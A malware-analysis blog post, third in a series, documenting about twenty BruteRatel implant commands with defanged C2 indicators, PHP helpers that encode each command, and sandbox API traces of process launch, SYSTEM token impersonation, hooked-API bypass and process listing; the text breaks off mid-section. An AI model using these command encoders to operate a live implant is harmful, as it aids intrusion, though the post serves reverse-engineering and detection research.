---
title: "BruteRatel full command analysis (3/X)"
date: 2025-03-20 
---

<link rel="stylesheet" href="/css/main.css">

## BRUTERATEL COMMAND LIST PART 3

## Context  

BruteRatel SHA256 : d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1  

Sample Source :  
[bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)   

VirusTotal :  
[VirusTotal](https://www.virustotal.com/gui/file/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1)  

Network / C2 :  
http://tiguanin[.]com/bazar.php:8041  
http://tiguanin[.]com/admin.php:8041  
http://bazarunet[.]com/admin.php:8041  
http://bazarunet[.]com/bazar.php:8041  
http://greshunka[.]com/bazar.php:8041  
http://greshunka[.]com/admin.php:8041  

# INTRO  

This article is the third part of my full analysis of BruteRatel commands : [Previous Part](https://cedricg-mirror.github.io/2025/03/19/BruteRatel2.html)  

This detailed analysis will be split into several parts, I will be presenting in this post the next 20 commands that BruteRatel can respond to.  

# COMMAND LIST

Here is a short description of the next 20 command codes and purpose :  

| Command ID   | Description             | Parameter         |
| :----------- | :---------------------- | :----------------:|
| "\xb0\xe9"   | [CreateProcessA](#CreateProcessA) | $process_path              |
| "\xc0\xeb"   | [TerminateProcess](#TerminateProcess) | $pid            |
| "\xd0\xbe"   | [ShellExecuteExA](#ShellExecuteExA) | $verb, $file, $parameters            |
| "\xe0\x9d"   | [ListActiveProcess](#ListActiveProcess) | NA                |
| "\xae\x6b"   | [ImpersonateSystem](#ImpersonateSystem) | NA |
| "\x39\x6f"   | [ImpersonateSystem2](#ImpersonateSystem2) | NA  |
| "\xd9\xf3"   | [unknown](#unknown) | $p1, $p2 |
| "\xd4\x3f"   | [unknown2](#unknown2) | $p1, $p2          |
| "\x74\x2c"   | [ReadFileW](#ReadFileW) | $filename, $size_in_KB              |
| "\x36\x6c"   | [RegEnumKeyA](#RegEnumKeyA) | $hKey, $SubKey       |
| "\x58\xb4"   | [QueryServiceConfig](#QueryServiceConfig) | $MachineName, $p2, $ServiceName       |
| "\xea\xe2"   | [unknown3](#unknown3) | $p1         |
| "\xa1\x13"   | [WriteFile](#WriteFile) | $filename, $data   |
| "\x9a\x69"   | [listen](#listen) | $label, $port        |
| "\x4d\x3c"   | [pipe_com_todo](#pipe_com_todo) | $PipeName   $p2     |
| "\x37\xfe"   | [install_as_service](#install_as_service) | $MachineName, $serviceName, $payload |
| "\xe9\x97"   | [createService](#createService) | $MachineName, $serviceName, $path     | 
| "\x73\xfa"   | [deleteService](#deleteService) | $MachineName, $serviceName | 
| "\x3e\x3b"   | [changeServiceConfig](#changeServiceConfig) | $MachineName, $serviceName, $BinaryPathName | 
| "\x62\xc6"   | [GetProcessInfo](#GetProcessInfo) | $processName |
| "\x91\xe5"   | [port_scan](#port_scan) | $hostname, $ports |

# Dynamic Analysis  

In the following section, I share some dynamic analysis results from the aforementioned commands :  

<a id="CreateProcessA"></a>
# CreateProcessA  

```php
function CreateProcessA($process_path)
{
	$cmd_id = "\xb0\xe9 $process_path";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [394]
[PTP] [0x830] [0x650] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000005119FBC300
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Z8T+SPw1bxDY1Be/GmRu9mIddycli/bRCITrYz8jJMOVXFyVo6Y/JvrWW8Kodg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0
[PAR] DWORD   *pcbBinary : 0x000000511C03EAAC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x511befbe5c]
```

**II. Execution**   

```html
[CNT] [418]
[PTP] [0x830] [0x4e4] [c:\windows\system32\rundll32.exe]
[API] <CreatePipe> in [KERNEL32.DLL] 
[PAR] PHANDLE               hReadPipe        : 0x000000511C5ADF38
[PAR] PHANDLE               hWritePipe       : 0x000000511C5ADF40
[PAR] LPSECURITY_ATTRIBUTES lpPipeAttributes : 0x000000511C5ADF78
[PAR] DWORD                 nSize            : 0x0
[RET] [0x511bf0b70d]

[ * ] [pid 0x830][tid 0x4e4] c:\windows\system32\rundll32.exe
[API] <CreatePipe>
[PAR] HANDLE  hReadPipe  : 0x2f8
[PAR] HANDLE  hWritePipe : 0x2fc
[RES] BOOL 0x1

[CNT] [428]
[PTP] [0x830] [0x4e4] [c:\windows\system32\rundll32.exe]
[API] <CreateProcessA> in [KERNEL32.DLL] 
[PAR] LPCTSTR               lpApplicationName    : 0x0 (null)
[PAR] LPCTSTR               lpCommandLine        : 0x0000005119FE0CF0
[STR]                       -> "nmap -v -A 169.254.143.46"
[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes  : 0x0
[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes   : 0x0
[PAR] BOOL                  bInheritHandles      : 0x1
[PAR] DWORD                 dwCreationFlags      : 0x8000000 (CREATE_NO_WINDOW)
[PAR] LPVOID                lpEnvironment        : 0x0
[PAR] LPCSTR                lpCurrentDirectory   : 0x0 (null)
[PAR] LPSTARTUPINFOA        lpStartupInfo        : 0x000000511C5ADF90
[FLD]                       -> lpDesktop   = 0x0 (null)
[FLD]                       -> lpTitle     = 0x0 (null)
[FLD]                       -> dwFlags     = 0x100 (STARTF_USESTDHANDLES)
[FLD]                       -> wShowWindow = 0x0
[FLD]                       -> hStdInput   = 0x0
[FLD]                       -> hStdOutput  = 0x2fc
[FLD]                       -> hStdError   = 0x2fc
[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x000000511C5ADF60
[RET] [0x511bf0b8ee]

[CNT] [460]
[PTP] [0x830] [0x4e4] [c:\windows\system32\rundll32.exe]
[API] <PeekNamedPipe> in [KERNEL32.DLL] 
[PAR] HANDLE  hNamedPipe             : 0x2f8
[PAR] LPVOID  lpBuffer               : 0x0
[PAR] DWORD   nBufferSize            : 0x0
[PAR] LPDWORD lpBytesRead            : 0x0
[PAR] LPDWORD lpTotalBytesAvail      : 0x000000511C5ADF2C
[PAR] LPDWORD lpBytesLeftThisMessage : 0x0
[RET] [0x511bf0bba0]

[...]
```

**III. Result**   

```html
[CNT] [113299]
[PTP] [0x638] [0x3e4] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000006E1201CA70
[STR]        -> "B0E9"
[STR]           "AD nmap -v -A 169.254.143.46"
[STR]           "Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-19 13:20 Paris, Madrid"
[STR]           "NSE: Loaded 157 scripts for scanning."
[STR]           "NSE: Script Pre-scanning."
[STR]           "Initiating NSE at 13:20"
[STR]           "Completed NSE at 13:20, 0.00s elapsed"
[STR]           "Initiating NSE at 13:20"
[STR]           "Completed NSE at 13:20, 0.00s elapsed"
[STR]           "Initiating NSE at 13:20"
[STR]           "Completed NSE at 13:20, 0.00s elapsed"
[STR]           "Initiating ARP Ping Scan at 13:20"
[STR]           "Scanning 169.254.143.46 [1 port]"
[STR]           "Completed ARP Ping Scan at 13:20, 0.12s elapsed (1 total hosts)"
[STR]           "Initiating SYN Stealth Scan at 13:20"
[STR]           "Scanning api.dropbox.com (169.254.143.46) [1000 ports]"
[STR]           "Discovered open port 80/tcp on 169.254.143.46"
[STR]           "Discovered open port 443/tcp on 169.254.143.46"
[STR]           "Completed SYN Stealth Scan at 13:20, 0.16s elapsed (1000 total ports)"
[STR]           "Initiating Service scan at 13:20"
[PAR] DWORD  cbBinary   : 0x636
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000006E12050140
[PAR] DWORD* pcchString : 0x0000006E144EDCEC
[RET] [0x6e13e5e028]
```

<a id="TerminateProcess"></a>
# TerminateProcess  

```php
function TerminateProcess($pid)
{
	$cmd_id = "\xc0\xeb $pid";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0xeb0] [0xec0] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000A936995F00
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Y8TmSNMyNUr21mv2Ui1u9VBz"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000A9369A9780
[PAR] DWORD   *pcbBinary : 0x000000A93885E94C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xa9387bbea1]
```

**II. Execution**   

```html
[CNT] [335]
[PTP] [0xeb0] [0xec0] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x000000A93885E838
[PAR] ACCESS_MASK         DesiredAccess    : 0x1 (PROCESS_TERMINATE)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x000000A93885E850
[PAR] PCLIENT_ID          ClientId         : 0x000000A93885E840
[RET] [0xa9387d4aab]

[CNT] [336]
[PTP] [0xeb0] [0xec0] [c:\windows\system32\rundll32.exe]
[API] <TerminateProcess> in [KERNEL32.DLL] 
[PAR] HANDLE hProcess : 0x2f4
[PAR] UINT uExitCode  : 0x1
[RET] [0xa9387c1b17]
```

**III. Result**   

```html
[CNT] [346]
[PTP] [0xeb0] [0xec0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000A93699DB00
[STR]        -> "C0EB"
[STR]           "2960"
[PAR] DWORD  cbBinary   : 0x12
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000A936995F00
[PAR] DWORD* pcchString : 0x000000A93885E78C
[RET] [0xa9387be028]
```
<a id="ShellExecuteExA"></a>
# ShellExecuteExA  

```php
function ShellExecuteExA($verb, $file, $parameters)
{
	$cmd_id = "\xd0\xbe $verb $file $parameters";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [361]
[PTP] [0x3a8] [0x45c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000DB6C938CF0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+JMehSPxrHBTZ/hSjGlV99FAgYCoI09CWC62LPxYONJSUci3CtKY/JvrWW8Kodg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000DB6C946030
[PAR] DWORD   *pcbBinary : 0x000000DB6E95EA0C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xdb6e8bbea1]
```

**II. Execution**   

```html
[CNT] [374]
[PTP] [0x3a8] [0x45c] [c:\windows\system32\rundll32.exe]
[API] <ShellExecuteEx> in [SHELL32.dll] 
[PAR] LPSHELLEXECUTEINFO lpExecInfo : 0x000000DB6E95E8C0
[FLD]                    -> lpVerb       = "open"
[FLD]                    -> lpFile       = "autorunsc64.exe"
[FLD]                    -> lpParameters = "-a b"
[FLD]                    -> lpDirectory  = "(null)"
[RET] [0xdb6e8cf4f3]
```

**III. Result**   

```html
[CNT] [394]
[PTP] [0x3a8] [0x45c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000DB6C99A010
[STR]        -> "D0BE"
[STR]           "1724 autorunsc64.exe"
[PAR] DWORD  cbBinary   : 0x32
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000DB6C957550
[PAR] DWORD* pcchString : 0x000000DB6E95E7CC
[RET] [0xdb6e8be028]
```

<a id="ListActiveProcess"></a>
# ListActiveProcess  

```php
function ListActiveProcess()
{
	$cmd_id = "\xe0\x9d";
	
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [1174]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000000E7E6963C0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+IMGlErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000000E7E6A6750
[PAR] DWORD   *pcbBinary : 0x0000000E007AE9DC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xe0070bea1]
```

**II. Execution**   

```html
[CNT] [1182]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[API] <RtlAdjustPrivilege> in [ntdll.dll] 
[PAR] ULONG    Privilege  : 0x14
[PAR] BOOLEAN  Enable     : 0x1
[PAR] BOOLEAN  Client     : 0x0
[PAR] PBOOLEAN WasEnabled : 0x0000000E007ADFCC
[RET] [0xe00709a5c]

[CNT] [1189]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[API] <CreateToolhelp32Snapshot> in [KERNEL32.DLL] 
[PAR] DWORD dwFlags       : 0x2 ( TH32CS_SNAPPROCESS)
[PAR] DWORD th32ProcessID : 0x0
[RET] [0xe00717bab]

[CNT] [1190]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[API] <Process32FirstW> in [KERNEL32.DLL] 
[PAR] HANDLE            hSnapshot : 0x374
[PAR] LPPROCESSENTRY32W lppe      : 0x0000000E007AE6B8
[RET] [0xe00717bcd]

[CNT] [1191]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x0000000E007AE050
[PAR] ACCESS_MASK         DesiredAccess    : 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x0000000E007AE070
[PAR] PCLIENT_ID          ClientId         : 0x0000000E007AE060
[RET] [0xe00724aab]

[CNT] [1198]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[API] <Process32NextW> in [KERNEL32.DLL] 
[PAR] HANDLE            hSnapshot : 0x374
[PAR] LPPROCESSENTRY32W lppe      : 0x0000000E007AE6B8
[RET] [0xe00717fc1]

[ * ] [pid 0xb10][tid 0x6d4] c:\windows\system32\rundll32.exe
[API] <Process32NextW>
[PAR] LPPROCESSENTRY32W lppe : 0x0000000E007AE6B8
[FLD]                   -> th32ProcessID = 0x4
[FLD]                   -> szExeFile     = "System"
[RES] BOOL 0x1

[...]

[ * ] [pid 0xb10][tid 0x6d4] c:\windows\system32\rundll32.exe
[API] <Process32NextW>
[PAR] LPPROCESSENTRY32W lppe : 0x0000000E007AE6B8
[FLD]                   -> th32ProcessID = 0xa30
[FLD]                   -> szExeFile     = "VBoxTray.exe"
[RES] BOOL 0x1

[CNT] [1411]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x0000000E007AE050
[PAR] ACCESS_MASK         DesiredAccess    : 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x0000000E007AE070
[PAR] PCLIENT_ID          ClientId         : 0x0000000E007AE060
[RET] [0xe00724aab]

[CNT] [1412]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcessToken> in [ntdll.dll] 
[PAR] HANDLE      ProcessHandle : 0x370
[PAR] ACCESS_MASK DesiredAccess : 0x8 (TOKEN_QUERY)
[PAR] PHANDLE     TokenHandle   : 0x0000000E007AE038
[RET] [0xe00724b2f]

[CNT] [1414]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[API] <GetTokenInformation> in [ADVAPI32.dll] 
[PAR] HANDLE                  TokenHandle            : 0x37c
[PAR] TOKEN_INFORMATION_CLASS TokenInformationClass  : 0x1(TokenUser)
[PAR] LPVOID                  TokenInformation       : 0x0000000E7E6969C0
[PAR] DWORD                   TokenInformationLength : 0x2c
[PAR] PDWORD                  ReturnLength           : 0x0000000E007AE024
[RET] [0xe00717cf4]

[CNT] [1415]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[API] <LookupAccountSidW> in [ADVAPI32.dll] 
[PAR] LPCWSTR       lpSystemName            : 0x0 (null)
[PAR] PSID          lpSid                   : 0x0000000E7E6969D0
[PAR] LPTSTR        lpName                  : 0x0000000E007AE0A0
[PAR] LPDWORD       cchName                 : 0x0000000E007AE028
[PAR] LPTSTR        lpReferencedDomainName  : 0x0000000E007AE2A8
[PAR] LPDWORD       cchReferencedDomainName : 0x0000000E007AE028
[PAR] PSID_NAME_USE peUse                   : 0x0000000E007AE02C
[RET] [0xe00717d38]

[CNT] [1416]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[API] <GetProcessImageFileNameW> in [PSAPI.DLL] 
[RET] [0xe00717d6c]

[CNT] [1417]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[API] <GetLogicalDrives> in [KERNEL32.DLL] 
[RET] [0xe0070c8cc]

[CNT] [1418]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[API] <QueryDosDeviceW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpDeviceName : 0x0000000E007AD972
[STR]         -> "C:"
[RET] [0xe0070c90f]

[CNT] [1419]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[API] <IsWow64Process> in [KERNEL32.DLL] 
[PAR] HANDLE hProcess     : 0x370
[PAR] PBOOL  Wow64Process : 0x0000000E007AE030
[RET] [0xe00717e09]

[...]
```

**III. Result**   

```html
[CNT] [1502]
[PTP] [0xb10] [0x6d4] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000000E7E6A4590
[STR]        -> "E09D"
[STR]           "0?0?N/A?2?N/A?[System Process]"
[STR]           "0?4?N/A?89?N/A?System"
[STR]           "4?280?N/A?2?N/A?smss.exe"
[STR]           "348?360?N/A?9?N/A?csrss.exe"
[STR]           "416?424?N/A?11?N/A?csrss.exe"
[STR]           "348?432?N/A?2?N/A?wininit.exe"
[STR]           "416?460?N/A?3?N/A?winlogon.exe"
[STR]           "432?524?N/A?3?N/A?services.exe"
[STR]           "432?532?N/A?6?N/A?lsass.exe"
[STR]           "524?592?N/A?9?N/A?svchost.exe"
[STR]           "524?624?N/A?7?N/A?svchost.exe"
[STR]           "460?756?N/A?7?N/A?dwm.exe"
[STR]           "524?780?N/A?12?N/A?VBoxService.exe"
[STR]           "524?864?N/A?22?N/A?svchost.exe"
[STR]           "524?912?N/A?26?N/A?svchost.exe"
[STR]           "524?960?N/A?15?N/A?svchost.exe"
[STR]           "524?1004?N/A?10?N/A?svchost.exe"
[STR]           "524?572?N/A?15?N/A?svchost.exe"
[STR]           "524?1052?N/A?9?N/A?spoolsv.exe"
[STR]           "524?1084?N/A?21?N/A?svchost.exe"
[STR]           "524?1284?N/A?17?N/A?MsMpEng.exe"
[STR]           "912?1888?x64?10?home\user?C:\Windows\System32\taskhostex.exe"
[STR]           "1916?2052?x64?53?home\user?C:\Windows\explorer.exe"
[STR]           "524?2280?N/A?1?N/A?svchost.exe"
[STR]           "524?2444?N/A?10?N/A?SearchIndexer.exe"
[STR]           "2052?2608?x64?11?home\user?C:\Windows\System32\VBoxTray.exe"
[STR]           "2052?556?x64?1?home\user?C:\Users\user\Desktop\Graphical Loader.exe"
[STR]           "2052?3024?x64?1?home\user?C:\Windows\System32\cmd.exe"
[STR]           "3024?2396?x64?2?home\user?C:\Windows\System32\conhost.exe"
[STR]           "3024?2832?x64?5?home\user?C:\Windows\System32\rundll32.exe"
[PAR] DWORD  cbBinary   : 0x8b0
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000000E7E6BC1E0
[PAR] DWORD* pcchString : 0x0000000E007ADF5C
[RET] [0xe0070e028]
```

<a id="ImpersonateSystem"></a>
# ImpersonateSystem  

```php
function ImpersonateSystem()
{
	$cmd_id = "\xae\x6b";
	
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0xb3c] [0x24c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000006F26E373D0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+ZubmErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000006F26E4A660
[PAR] DWORD   *pcbBinary : 0x0000006F28CFE6FC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x6f28c5bea1]
```

**II. Execution**   

```html
[CNT] [335]
[PTP] [0xb3c] [0x24c] [c:\windows\system32\rundll32.exe]
[API] <RtlAdjustPrivilege> in [ntdll.dll] 
[PAR] ULONG    Privilege  : 0x14
[PAR] BOOLEAN  Enable     : 0x1
[PAR] BOOLEAN  Client     : 0x0
[PAR] PBOOLEAN WasEnabled : 0x0000006F28CFE2BC
[RET] [0x6f28c59a5c]

[CNT] [336]
[PTP] [0xb3c] [0x24c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcessToken> in [ntdll.dll] 
[PAR] HANDLE      ProcessHandle : 0xFFFFFFFFFFFFFFFF
[PAR] ACCESS_MASK DesiredAccess : 0x8 (TOKEN_QUERY)
[PAR] PHANDLE     TokenHandle   : 0x0000006F28CFE288
[RET] [0x6f28c74b2f]

[CNT] [337]
[PTP] [0xb3c] [0x24c] [c:\windows\system32\rundll32.exe]
[API] <LookupPrivilegeValueA> in [ADVAPI32.dll] 
[PAR] LPCTSTR lpSystemName : 0x0 (null)
[PAR] LPCTSTR lpName       : 0x0000006F28CFE29B
[STR]         -> "SeDebugPrivilege"
[RET] [0x6f28c5a385]

[CNT] [338]
[PTP] [0xb3c] [0x24c] [c:\windows\system32\rundll32.exe]
[API] <PrivilegeCheck> in [ADVAPI32.dll] 
[PAR] HANDLE         ClientToken        : 0x2f8
[PAR] PPRIVILEGE_SET RequiredPrivileges : 0x0000006F28CFE2AC
[PAR] LPBOOL         pfResult           : 0x0000006F28CFE284
[RET] [0x6f28c5a3c9]

[CNT] [339]
[PTP] [0xb3c] [0x24c] [c:\windows\system32\rundll32.exe]
[API] <CreateToolhelp32Snapshot> in [KERNEL32.DLL] 
[PAR] DWORD dwFlags       : 0x2 ( TH32CS_SNAPPROCESS)
[PAR] DWORD th32ProcessID : 0x0
[RET] [0x6f28c5ed24]

[CNT] [340]
[PTP] [0xb3c] [0x24c] [c:\windows\system32\rundll32.exe]
[API] <Process32FirstW> in [KERNEL32.DLL] 
[PAR] HANDLE            hSnapshot : 0x2f8
[PAR] LPPROCESSENTRY32W lppe      : 0x0000006F28CFE068
[RET] [0x6f28c5ed43]

[CNT] [341]
[PTP] [0xb3c] [0x24c] [c:\windows\system32\rundll32.exe]
[API] <Process32NextW> in [KERNEL32.DLL] 
[PAR] HANDLE            hSnapshot : 0x2f8
[PAR] LPPROCESSENTRY32W lppe      : 0x0000006F28CFE068
[RET] [0x6f28c5ed53]

[ * ] [pid 0xb3c][tid 0x24c] c:\windows\system32\rundll32.exe
[API] <Process32NextW>
[PAR] LPPROCESSENTRY32W lppe : 0x0000006F28CFE068
[FLD]                   -> th32ProcessID = 0x4
[FLD]                   -> szExeFile     = "System"
[RES] BOOL 0x1

[CNT] [342]
[PTP] [0xb3c] [0x24c] [c:\windows\system32\rundll32.exe]
[API] <Process32NextW> in [KERNEL32.DLL] 
[PAR] HANDLE            hSnapshot : 0x2f8
[PAR] LPPROCESSENTRY32W lppe      : 0x0000006F28CFE068
[RET] [0x6f28c5ed53]

[ * ] [pid 0xb3c][tid 0x24c] c:\windows\system32\rundll32.exe
[API] <Process32NextW>
[PAR] LPPROCESSENTRY32W lppe : 0x0000006F28CFE068
[FLD]                   -> th32ProcessID = 0x118
[FLD]                   -> szExeFile     = "smss.exe"
[RES] BOOL 0x1

[...]

[ * ] [pid 0xb3c][tid 0x24c] c:\windows\system32\rundll32.exe
[API] <Process32NextW>
[PAR] LPPROCESSENTRY32W lppe : 0x0000006F28CFE068
[FLD]                   -> th32ProcessID = 0x1cc
[FLD]                   -> szExeFile     = "winlogon.exe"
[RES] BOOL 0x1

[CNT] [353]
[PTP] [0xb3c] [0x24c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x0000006F28CFE330
[PAR] ACCESS_MASK         DesiredAccess    : 0x400 (PROCESS_QUERY_INFORMATION)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x0000006F28CFE370
[PAR] PCLIENT_ID          ClientId         : 0x0000006F28CFE348
[RET] [0x6f28c74aab]

[CNT] [362]
[PTP] [0xb3c] [0x24c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcessToken> in [ntdll.dll] 
[PAR] HANDLE      ProcessHandle : 0x2f8
[PAR] ACCESS_MASK DesiredAccess : 0xa (TOKEN_DUPLICATE | TOKEN_QUERY)
[PAR] PHANDLE     TokenHandle   : 0x0000006F28D0ADB0
[RET] [0x6f28c74b2f]

[CNT] [363]
[PTP] [0xb3c] [0x24c] [c:\windows\system32\rundll32.exe]
[API] <ImpersonateLoggedOnUser> in [ADVAPI32.dll] 
[PAR] HANDLE  hToken : 0x2e8
[RET] [0x6f28c603c8]
```


<a id="ImpersonateSystem2"></a>
# ImpersonateSystem2  

```php
function ImpersonateSystem2()
{
	$cmd_id = "\x39\x6f";
	
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```
This command is a simple wrapper to the previous one. Maybe for some backward compatibility with previous version of the malware ?  


<a id="unknown"></a>
# unknown  

```php
// CreateProcess based on fields C1E0 and C26C from GlobalStruct
function unknown($p1, $p2)
{
	$p1_b64 = base64_encode($p1);
	
	$cmd_id = "\xd9\xf3 $p1_b64 $p2";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

Not sure yet, it definitly leads to a CreateProcessA call but in relation with internal structures I haven't reversed.  

<a id="unknown2"></a>
# unknown2  

```php
// CreateProcess based on fields C1E0 and C26C from GlobalStruct
function unknown2($p1, $p2)
{
	$p1_b64 = base64_encode($p1);
	
	$cmd_id = "\xd4\x3f $p1_b64 $p2";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

Not sure yet, it definitly leads to a CreateProcessA call but in relation with internal structures I haven't reversed.  

<a id="ReadFileW"></a>
# ReadFileW  

```php
// $size_in_KB is optional
// if 0 or not specified 512kb will be read from targeted file
function ReadFileW($filename, $size_in_KB)
{
	$filename_le16 = UConverter::transcode($filename, 'UTF-16LE', 'UTF-8');
	$p1_b64 = base64_encode($filename_le16);
	
	$cmd_id = "\x74\x2c $p1_b64 $size_in_KB";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [1487]
[PTP] [0x688] [0x654] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000CFBE4C85A0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+cMjiSMkOGDv2whCCK1hp61d+fGo6tPXyFLn0PSInEbGKFVnnuaxmWZuzXPGFDrHRILADuba+VvMEe8ChOZ+eMc5NGqU9Ow=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000CFBE4BBCD0
[PAR] DWORD   *pcbBinary : 0x000000CFC03BE8CC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xcfc031bea1]
```

**II. Execution**   

```html
[CNT] [1514]
